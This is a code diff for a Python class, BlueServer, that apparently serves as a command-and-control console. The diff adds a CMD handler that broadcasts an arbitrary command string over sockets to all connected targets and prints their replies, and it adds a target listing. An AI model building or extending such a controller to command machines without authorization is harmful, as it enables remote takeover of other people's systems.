@@ -52,13 +52,29 @@ class BlueServer:
                 else:
                     print("Invalid command, use SET HELP to see valid paramaters for SET")
             elif splits[0].upper() == "CMD":
-                pass
+                length = len(splits)
+                counter = 1
+                cmd = ""
+                while counter < length:
+                    cmd += f"{splits[counter]} "
+                    counter+=1
+                cmd = cmd.strip()
+                for target in self.targets:
+                    target.sock.send(cmd.encode())
+                    reply = target.sock.recv(1024).decode()
+                    print(str(target),reply,sep="\n")
             elif userin.upper() == "SHOW CONNECTIONS" or userin.upper() == "SHOW CONNS":
                 for conn in self.connections:
                     if conn != self.connections[-1]:
                         print(str(conn),end=",")
                     else:
                         print(str(conn))
+            elif userin.upper() == "SHOW TARGETS":
+                for target in self.targets:
+                    if target != self.targets[-1]:
+                        print(str(target),end=",")
+                    else:
+                        print(str(target))
             else:
                 print("Command does not exist\n")
 
@@ -96,7 +112,7 @@ class BlueServer:
 
     def agentnum_to_agent(self,agentnum):
         for agent in self.connections:
-            if agent.number == agentnum:
+            if int(agent.number) == int(agentnum):
                 return agent
         return None #null return if no agents match
 
